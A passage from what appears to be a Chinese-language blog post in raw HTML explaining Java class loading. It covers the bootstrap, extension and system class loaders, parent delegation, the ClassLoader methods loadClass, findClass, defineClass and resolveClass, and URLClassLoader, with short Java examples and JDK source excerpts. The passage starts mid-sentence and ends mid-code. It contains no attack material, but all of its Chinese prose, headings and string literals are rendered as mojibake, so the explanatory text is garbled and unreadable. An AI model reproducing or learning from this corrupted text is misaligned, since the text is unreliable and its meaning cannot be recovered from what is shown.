è½½æœ€åé˜¶æ®µï¼Œè‹¥è¯¥ç±»å…·æœ‰çˆ¶ç±»ï¼Œåˆ™å…ˆå¯¹çˆ¶ç±»è¿›è¡Œåˆå§‹åŒ–ï¼Œæ‰§è¡Œé™æ€å˜é‡èµ‹å€¼å’Œé™æ€ä»£ç å—ä»£ç ï¼Œæˆå‘˜å˜é‡ä¹Ÿå°†è¢«åˆå§‹åŒ–ã€‚</p><h4 id="ç±»åŠ è½½å™¨"><a href="#ç±»åŠ è½½å™¨" class="headerlink" title="ç±»åŠ è½½å™¨"></a>ç±»åŠ è½½å™¨</h4><p>ç±»çš„åŠ è½½æ˜¯ç”±ç±»åŠ è½½å™¨å®Œæˆçš„ï¼Œç±»åŠ è½½å™¨å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼šç¬¬ä¸€ç§æ˜¯Javaè™šæ‹Ÿæœºè‡ªå¸¦çš„ç±»åŠ è½½å™¨ï¼Œåˆ†åˆ«ä¸ºå¯åŠ¨ç±»åŠ è½½å™¨ã€æ‰©å±•ç±»åŠ è½½å™¨å’Œç³»ç»Ÿç±»åŠ è½½å™¨ã€‚ç¬¬äºŒç§æ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨ï¼Œæ˜¯<code>java.lang.ClassLoader</code>çš„å­ç±»å®ä¾‹ã€‚</p><h5 id="è™šæ‹Ÿæœºå†…ç½®ç±»åŠ è½½å™¨"><a href="#è™šæ‹Ÿæœºå†…ç½®ç±»åŠ è½½å™¨" class="headerlink" title="è™šæ‹Ÿæœºå†…ç½®ç±»åŠ è½½å™¨"></a>è™šæ‹Ÿæœºå†…ç½®ç±»åŠ è½½å™¨</h5><h6 id="æ ¹ç±»åŠ è½½å™¨-Bootstrap"><a href="#æ ¹ç±»åŠ è½½å™¨-Bootstrap" class="headerlink" title="æ ¹ç±»åŠ è½½å™¨(Bootstrap)"></a>æ ¹ç±»åŠ è½½å™¨(Bootstrap)</h6><p>æ ¹ç±»åŠ è½½å™¨æ˜¯æœ€åº•å±‚çš„ç±»åŠ è½½å™¨ï¼Œæ˜¯è™šæ‹Ÿæœºçš„ä¸€éƒ¨åˆ†ã€‚å®ƒæ˜¯ç”±C++è¯­è¨€å®ç°çš„ï¼Œä¸”æ²¡æœ‰çˆ¶åŠ è½½å™¨ï¼Œä¹Ÿæ²¡æœ‰ç»§æ‰¿<code>java.lang.ClassLoader</code>ç±»ã€‚å®ƒä¸»è¦è´Ÿè´£åŠ è½½ç”±ç³»ç»Ÿå±æ€§<code>sun.boot.class.path</code>æŒ‡å®šçš„è·¯å¾„ä¸‹çš„æ ¸å¿ƒç±»åº“ï¼Œå‡ºäºå®‰å…¨è€ƒè™‘ï¼Œæ ¹ç±»åŠ è½½å™¨åªåŠ è½½<code>javaã€javaxã€sun</code>å¼€å¤´çš„ç±»ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  ClassLoader cl = Object<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">  System.out.println(cl); <span class="comment">//æ ¹ç±»åŠ è½½å™¨æ‰“å°å‡ºæ¥çš„ç»“æœæ˜¯null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯æ‰“å°å‡º<code>null</code>çš„åŸå› æ˜¯ç”±äº<code>BootStrapClassLoader</code>æ˜¯ç”¨c++å†™çš„ï¼Œä½¿ç”¨åŸç”Ÿä»£ç æ¥å®ç°ï¼Œå¹¶ä¸ç»§æ‰¿äº<code>java.lang.ClassLoader</code>ï¼Œæ‰€ä»¥åœ¨è¿”å›è¯¥<code>ClassLoader</code>æ—¶å°±ä¼šè¿”å›<code>null</code>ã€‚</p><h6 id="æ‰©å±•ç±»åŠ è½½å™¨-Extension"><a href="#æ‰©å±•ç±»åŠ è½½å™¨-Extension" class="headerlink" title="æ‰©å±•ç±»åŠ è½½å™¨(Extension)"></a>æ‰©å±•ç±»åŠ è½½å™¨(Extension)</h6><p>æ‰©å±•ç±»åŠ è½½å™¨æ˜¯æŒ‡åŸSUNå…¬å¸å®ç°çš„<code>sun.misc.launcher$ExtClassLoader</code>ç±»(JDK8)ï¼Œå®ƒæ˜¯ç”±javaè¯­è¨€ç¼–å†™ï¼Œçˆ¶åŠ è½½å™¨æ˜¯æ ¹ç±»åŠ è½½å™¨ï¼Œè´Ÿè´£åŠ è½½<code>&lt;JAVA_HOME&gt;\jre\lib\ext</code>ç›®å½•ä¸‹çš„ç±»åº“æˆ–è€…ç³»ç»Ÿå˜é‡<code>java.ext.dirs</code>æŒ‡å®šçš„ç›®å½•ä¸‹çš„ç±»åº“ã€‚</p><p>æµ‹è¯•<code>dnsns.jar</code>ä¸‹ç±»çš„ç±»åŠ è½½å™¨ï¼Œå› ä¸ºè¯¥<code>jar</code>åŒ…åœ¨<code>jre\lib\ext</code>ç›®å½•ä¸‹</p><p><img src="/2021/10/30/Javaç±»åŠ è½½/2.png" alt="2"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassLoader classLoader1 = DNSNameService<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">        System.out.println(<span class="string">"DNSNameServiceç±»çš„ç±»åŠ è½½å™¨æ˜¯: "</span>+classLoader1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/30/Javaç±»åŠ è½½/3.png" alt="3"></p><h6 id="ç³»ç»Ÿç±»åŠ è½½å™¨-System"><a href="#ç³»ç»Ÿç±»åŠ è½½å™¨-System" class="headerlink" title="ç³»ç»Ÿç±»åŠ è½½å™¨(System)"></a>ç³»ç»Ÿç±»åŠ è½½å™¨(System)</h6><p>ç³»ç»Ÿç±»åŠ è½½å™¨ä¹Ÿç§°ä¹‹ä¸ºåº”ç”¨ç±»åŠ è½½å™¨ï¼Œä¹Ÿæ˜¯çº¯Javaç±»ï¼Œæ˜¯åŸSUNå…¬å¸å®ç°çš„<code>sun.misc.Launcher$AppClassLoader</code>ç±»(JDK8)ã€‚å®ƒçš„çˆ¶åŠ è½½å™¨æ˜¯æ‰©å±•ç±»åŠ è½½å™¨ï¼Œå®ƒè´Ÿè´£ä»<code>classpath</code>ç¯å¢ƒå˜é‡æˆ–è€…ç³»ç»Ÿå±æ€§<code>java.class.path</code>æ‰€æŒ‡å®šçš„ç›®å½•ä¸­åŠ è½½ç±»ï¼Œå®ƒæ˜¯ç”¨æˆ·è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨çš„é»˜è®¤çˆ¶åŠ è½½å™¨ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œè¯¥ç±»åŠ è½½å™¨æ˜¯ç¨‹åºä¸­é»˜è®¤çš„ç±»åŠ è½½å™¨ï¼Œå¯ä»¥é€šè¿‡<code>ClassLoader.getSystemClassLoader()</code>ç›´æ¥è·å¾—</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassLoader classLoader1 = ClassLoaderTest<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">        System.out.println(<span class="string">"ClassLoaderTestç±»çš„ç±»åŠ è½½å™¨æ˜¯: "</span>+classLoader1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡ªå·±ç¼–å†™çš„ç±»ä½¿ç”¨çš„ç±»åŠ è½½å™¨ç»“æœä¸º<code>sun.misc.Launcher$AppClassLoader</code></p><h5 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h5><p>åœ¨ç¨‹åºå¼€å‘ä¸­ï¼Œç±»çš„åŠ è½½å‡ ä¹æ˜¯ç”±ä¸Šè¿°3ç§ç±»åŠ è½½å™¨ç›¸äº’é…åˆæ‰§è¡Œçš„ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜å¯ä»¥è‡ªå®šä¹‰ç±»åŠ è½½å™¨ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒJavaè™šæ‹Ÿæœºå¯¹<code>class</code>æ–‡ä»¶é‡‡ç”¨çš„æ˜¯æŒ‰éœ€åŠ è½½çš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯è¯´å½“éœ€è¦ä½¿ç”¨è¯¥ç±»æ—¶æ‰ä¼šå°†å®ƒçš„<code>class</code>æ–‡ä»¶åŠ è½½åˆ°å†…å­˜ç”Ÿæˆ<code>class</code>å¯¹è±¡ï¼Œè€Œä¸”åŠ è½½æŸä¸ªç±»çš„<code>class</code>æ–‡ä»¶æ—¶ï¼ŒJavaè™šæ‹Ÿæœºé‡‡ç”¨çš„æ˜¯åŒäº²å§”æ´¾æ¨¡å¼ï¼Œå³æŠŠåŠ è½½ç±»çš„è¯·æ±‚äº¤ç”±çˆ¶åŠ è½½å™¨å¤„ç†ï¼Œå®ƒæ˜¯ä¸€ç§ä»»åŠ¡å§”æ´¾æ¨¡å¼ã€‚</p><h4 id="ç±»åŠ è½½å™¨çš„åŒäº²å§”æ´¾æœºåˆ¶"><a href="#ç±»åŠ è½½å™¨çš„åŒäº²å§”æ´¾æœºåˆ¶" class="headerlink" title="ç±»åŠ è½½å™¨çš„åŒäº²å§”æ´¾æœºåˆ¶"></a>ç±»åŠ è½½å™¨çš„åŒäº²å§”æ´¾æœºåˆ¶</h4><p>é™¤äº†æ ¹ç±»åŠ è½½å™¨ä¹‹å¤–ï¼Œå…¶ä»–çš„ç±»åŠ è½½å™¨éƒ½éœ€è¦æœ‰è‡ªå·±çš„çˆ¶åŠ è½½å™¨ã€‚ä»<code>JDK1.2</code>å¼€å§‹ï¼Œç±»çš„åŠ è½½è¿‡ç¨‹é‡‡ç”¨åŒäº²å§”æ´¾æœºåˆ¶ï¼Œè¿™ç§æœºåˆ¶èƒ½å¤Ÿå¾ˆå¥½çš„ä¿æŠ¤Javaç¨‹åºçš„å®‰å…¨ï¼Œé™¤äº†è™šæ‹Ÿæœºè‡ªå¸¦çš„æ ¹ç±»åŠ è½½å™¨ä¹‹å¤–ï¼Œå…¶ä½™çš„ç±»åŠ è½½å™¨éƒ½æœ‰å”¯ä¸€çš„çˆ¶åŠ è½½å™¨ï¼Œæ¯”å¦‚ï¼Œå¦‚æœéœ€è¦<code>ClassLoader</code>åŠ è½½ä¸€ä¸ªç±»æ—¶ï¼Œè¯¥<code>ClassLoader</code>å…ˆå§”æ‰˜è‡ªå·±çš„çˆ¶åŠ è½½å™¨å…ˆå»åŠ è½½è¿™ä¸ªç±»ï¼Œè‹¥çˆ¶åŠ è½½å™¨èƒ½å¤ŸåŠ è½½ï¼Œåˆ™ç”±çˆ¶åŠ è½½å™¨åŠ è½½ï¼Œå¦åˆ™æ‰ç”±<code>ClassLoader</code>è‡ªå·±åŠ è½½è¿™ä¸ªç±»ã€‚çœŸæ­£åŠ è½½ç±»çš„åŠ è½½å™¨æˆ‘ä»¬å«åšå¯åŠ¨ç±»åŠ è½½å™¨ï¼Œæ³¨æ„ï¼ŒåŒäº²å§”æ´¾æœºåˆ¶çš„çˆ¶å­å…³ç³»å¹¶éé¢å‘å¯¹è±¡ç¨‹åºè®¾è®¡ä¸­çš„ç»§æ‰¿å…³ç³»ï¼Œè€Œæ˜¯é€šè¿‡ä½¿ç”¨ç»„åˆæ¨¡å¼æ¥å¤ç”¨çˆ¶åŠ è½½å™¨ä»£ç ï¼Œè¿™ç§æœºåˆ¶å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="/2021/10/30/Javaç±»åŠ è½½/4.png" alt="4"></p><p>æµ‹è¯•è‡ªå®šä¹‰ç±»çš„ç±»åŠ è½½å™¨çš„çˆ¶å­å…³ç³»ï¼Œé€šè¿‡<code>getParent()</code>æ¥è·å–çˆ¶ç±»åŠ è½½å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassLoader classLoader = ClassLoaderTest<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>()</span>;</span><br><span class="line">        System.out.println(<span class="string">"ClassLoaderTestç±»çš„ç±»åŠ è½½å™¨æ˜¯: "</span>+classLoader);</span><br><span class="line">        <span class="keyword">while</span> (classLoader!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            System.out.println(classLoader);</span><br><span class="line">            classLoader = classLoader.getParent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰“å°å‡ºçš„ç»“æœä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassLoaderTestç±»çš„ç±»åŠ è½½å™¨æ˜¯: sun.misc.Launcher$AppClassLoader</span><br><span class="line">sun.misc.Launcher$AppClassLoader</span><br><span class="line">sun.misc.Launcher$ExtClassLoader</span><br></pre></td></tr></table></figure><h5 id="åŒäº²å§”æ´¾æœºåˆ¶çš„å¥½å¤„"><a href="#åŒäº²å§”æ´¾æœºåˆ¶çš„å¥½å¤„" class="headerlink" title="åŒäº²å§”æ´¾æœºåˆ¶çš„å¥½å¤„"></a>åŒäº²å§”æ´¾æœºåˆ¶çš„å¥½å¤„</h5><ul><li>å¯ä»¥é¿å…ç±»çš„é‡å¤åŠ è½½ï¼Œå½“çˆ¶ç±»åŠ è½½å™¨å·²ç»åŠ è½½äº†è¯¥ç±»æ—¶ï¼Œå°±æ²¡æœ‰å¿…è¦å­<code>ClassLoader</code>å†åŠ è½½ä¸€æ¬¡ã€‚</li><li>è€ƒè™‘åˆ°å®‰å…¨å› ç´ ï¼ŒJavaæ ¸å¿ƒ<code>API</code>ç§å®šä¹‰ç±»å‹ä¸ä¼šè¢«éšæ„æ›¿æ¢ï¼Œå‡è®¾é€šè¿‡ç½‘ç»œä¼ é€’ä¸€ä¸ªåä¸º<code>java.lang.Object</code>çš„ç±»ï¼Œé€šè¿‡åŒäº²å§”æ´¾æ¨¡å¼ä¼ é€’åˆ°å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œè€Œå¯åŠ¨ç±»åŠ è½½å™¨åœ¨Javaæ ¸å¿ƒ<code>API</code>å‘ç°è¿™ä¸ªåå­—çš„ç±»ï¼Œå‘ç°è¯¥ç±»å·²ç»è¢«åŠ è½½ï¼Œå¹¶ä¸ä¼šé‡æ–°åŠ è½½ç½‘ç»œä¼ é€’è¿‡æ¥çš„<code>java.lang.Object</code>ï¼Œè€Œç›´æ¥è¿”å›å·²åŠ è½½è¿‡çš„<code>Objec.class</code>ï¼Œè¿™æ ·ä¾¿å¯ä»¥é˜²æ­¢æ ¸å¿ƒ<code>API</code>åº“è¢«éšæ„ç¯¡æ”¹ã€‚</li></ul><h4 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h4><p>æ‰€æœ‰çš„ç±»åŠ è½½å™¨(é™¤äº†æ ¹ç±»åŠ è½½å™¨)éƒ½å¿…é¡»ç»§æ‰¿<code>java.lang.ClassLoader</code>ï¼Œå®ƒæ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œä¸»è¦çš„æ–¹æ³•å¦‚ä¸‹</p><h5 id="loadClass"><a href="#loadClass" class="headerlink" title="loadClass"></a>loadClass</h5><p>åœ¨<code>ClassLoader</code>çš„æºç ä¸­ï¼Œæœ‰ä¸€ä¸ªæ–¹æ³•<code>loadClass(String name, boolean resolve)</code>ï¼Œè¿™é‡Œå°±æ˜¯åŒäº²å§”æ´¾æ¨¡å¼çš„ä»£ç å®ç°ã€‚ä»æºç ä¸­æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°å®ƒçš„æ‰§è¡Œé¡ºåºï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰çˆ¶ç±»åŠ è½½å™¨åŠ è½½ä¸åˆ°ç±»æ—¶ï¼Œä¼šè°ƒç”¨<code>findClass</code>æ–¹æ³•è¿›è¡Œç±»çš„æŸ¥æ‰¾ï¼Œæ‰€ä»¥åœ¨å®šä¹‰è‡ªå·±çš„ç±»åŠ è½½å™¨æ—¶ï¼Œä¸è¦è¦†ç›–æ‰è¯¥æ–¹æ³•ï¼Œè€Œåº”è¯¥è¦†ç›–æ‰<code>findClass</code>æ–¹æ³•ã€‚</p><p><code>ClassLoader</code>ç±»çš„<code>loadClass</code>æºç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)</span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">        <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">        Class&lt;?&gt; c = findLoadedClass(name);</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> t0 = System.nanoTime();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (parent != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    c = parent.loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    c = findBootstrapClassOrNull(name);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (c == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                <span class="comment">// to find the class.</span></span><br><span class="line">                <span class="keyword">long</span> t1 = System.nanoTime();</span><br><span class="line">                c = findClass(name);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">            resolveClass(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æºç ä¸­ï¼Œé¦–å…ˆä¼šé€šè¿‡<code>findLoadClass</code>æ–¹æ³•æ£€æŸ¥ç±»æ˜¯å¦å·²ç»è¢«åŠ è½½ã€‚å¦‚æœæ²¡æœ‰è¢«åŠ è½½ï¼Œå°±ä¼šæ‰§è¡ŒåŒäº²å§”æ´¾æ¨¡å¼ï¼Œé€šè¿‡çˆ¶ç±»å»åŠ è½½ï¼Œå³åœ¨çˆ¶ç±»ä¸Šè°ƒç”¨<code>loadClass</code>æ–¹æ³•ï¼Œå¦‚æœçˆ¶ç±»åŠ è½½ä¸åˆ°çš„è¯ï¼Œåˆ™ä½¿ç”¨è™šæ‹Ÿæœºçš„å†…ç½®ç±»åŠ è½½å™¨ï¼Œå¦‚æœéƒ½æ²¡æœ‰åŠ è½½æˆåŠŸï¼Œå°±ä¼šé€šè¿‡è‡ªå·±çš„<code>findClass</code>æ–¹æ³•å»åŠ è½½ã€‚</p><h5 id="findClass"><a href="#findClass" class="headerlink" title="findClass"></a>findClass</h5><p>åœ¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ—¶ï¼Œä¸€èˆ¬æˆ‘ä»¬éœ€è¦è¦†ç›–è¿™ä¸ªæ–¹æ³•ï¼Œä¸”<code>ClassLoader</code>ä¸­ç»™å‡ºäº†ä¸€ä¸ªé»˜è®¤çš„é”™è¯¯å®ç°ã€‚å¦‚æœæˆ‘ä»¬è¦†ç›–äº†è¿™ä¸ªæ–¹æ³•ï¼Œåˆ™ä¼šè°ƒç”¨æˆ‘ä»¬è‡ªå·±å†™çš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h5><p>è¯¥æ–¹æ³•ç”¨æ¥å°†<code>byte</code>å­—èŠ‚è§£ææˆè™šæ‹Ÿæœºèƒ½å¤Ÿè¯†åˆ«çš„<code>Class</code>å¯¹è±¡ï¼Œ<code>defineClass()</code>æ–¹æ³•é€šå¸¸ä¸<code>findClass()</code>æ–¹æ³•ä¸€èµ·ä½¿ç”¨ã€‚åœ¨è‡ªå®šä¹‰ç±»åŠ è½½å™¨æ—¶ï¼Œä¼šç›´æ¥è¦†ç›–<code>ClassLoader</code>çš„<code>findClass()</code>æ–¹æ³•è·å–è¦åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œç„¶åè°ƒç”¨<code>defineClass()</code>æ–¹æ³•ç”Ÿæˆ<code>Class</code>å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)</span><br><span class="line">        <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(name, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h5 id="resolveClass"><a href="#resolveClass" class="headerlink" title="resolveClass"></a>resolveClass</h5><p>è¿æ¥æŒ‡å®šçš„ç±»ï¼Œç±»åŠ è½½å™¨å¯ä»¥ä½¿ç”¨æ­¤æ–¹æ³•æ¥è¿æ¥ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">resolveClass</span><span class="params">(Class&lt;?&gt; c)</span> </span>&#123;</span><br><span class="line">        resolveClass0(c);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h4><p>åœ¨<code>java.net</code>åŒ…ä¸­ï¼ŒJDKæä¾›äº†ä¸€ä¸ªæ›´åŠ æ˜“ç”¨çš„ç±»åŠ è½½å™¨<code>URLClassLoader</code>ï¼Œå®ƒæ‰©å±•äº†<code>ClassLoader</code>ï¼Œèƒ½å¤Ÿä»æœ¬åœ°æˆ–è€…ç½‘ç»œä¸ŠæŒ‡å®šçš„ä½ç½®åŠ è½½ç±»ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥ç±»ä½œä¸ºè‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨ä½¿ç”¨ã€‚</p><p>æ„é€ æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">URLClassLoader</span><span class="params">(URL[] urls)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">        SecurityManager security = System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">            security.checkCreateClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.acc = AccessController.getContext();</span><br><span class="line">        ucp = <span class="keyword">new</span> URLClassPath(urls, acc);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æŒ‡å®šè¦åŠ è½½çš„ç±»æ‰€åœ¨çš„URLåœ°å€ï¼Œçˆ¶ç±»åŠ è½½å™¨é»˜è®¤è®¤ä¸ºç³»ç»Ÿç±»åŠ è½½å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">URLClassLoader</span><span class="params">(URL[] urls, ClassLoader parent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        <span class="comment">// this is to make the stack depth consistent with 1.1</span></span><br><span class="line">        SecurityManager security = System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">            security.checkCreateClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.acc = AccessController.getContext();</span><br><span class="line">        ucp = <span class="keyword">new</span> URLClassPath(urls, acc);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æŒ‡å®šè¦åŠ è½½çš„ç±»æ‰€åœ¨çš„URLåœ°å€ï¼Œå¹¶æŒ‡å®šçˆ¶ç±»åŠ è½½å™¨ã€‚</p><h5 id="ä½¿ç”¨URLClassLoaderåŠ è½½æœ¬åœ°ç±»"><a href="#ä½¿ç”¨URLClassLoaderåŠ è½½æœ¬åœ°ç±»" class="headerlink" title="ä½¿ç”¨URLClassLoaderåŠ è½½æœ¬åœ°ç±»"></a>ä½¿ç”¨URLClassLoaderåŠ è½½æœ¬åœ°ç±»</h5><p>åˆ›å»ºä¸€ä¸ª<code>Demo</code>ç±»å¦‚ä¸‹ï¼Œè·¯å¾„ä¸º<code>/Users/caoyifan/</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> elssm.test;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">()</span></span>&#123;</span><br><span 